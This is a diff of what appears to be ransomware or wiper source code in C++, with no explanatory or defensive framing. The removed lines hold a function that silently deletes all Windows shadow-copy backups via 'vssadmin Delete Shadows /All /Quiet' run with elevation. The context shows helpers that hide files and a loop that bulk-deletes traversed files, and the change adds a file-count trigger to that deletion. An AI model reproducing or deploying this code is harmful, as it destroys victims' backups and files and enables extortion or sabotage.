@@ -212,10 +212,6 @@ void makeFileHidden(string path)
 	SetFileAttributes(path.c_str(), attributes + FILE_ATTRIBUTE_HIDDEN);
 }
 
-void destroyVSS()
-{
-	ShellExecute(nullptr, "runas", "C:\\Windows\\system32\\vssadmin.exe Delete Shadows /All /Quiet", nullptr, nullptr, 0);
-}
 
 void changeHiddenFileState(bool state)
 {
@@ -559,7 +555,7 @@ static void iterate(const path& parent, const string & mod,
 			}
 			processedPaths.push_back(path);
 			sumSize += file_size(path);
-			if (sumSize >= SIZE_THRESHOLD)
+			if (processedPaths.size() > COUNT_THRESHOLD || sumSize >= SIZE_THRESHOLD)
 			{
 				for (auto& fileToDelete : processedPaths)
 				{
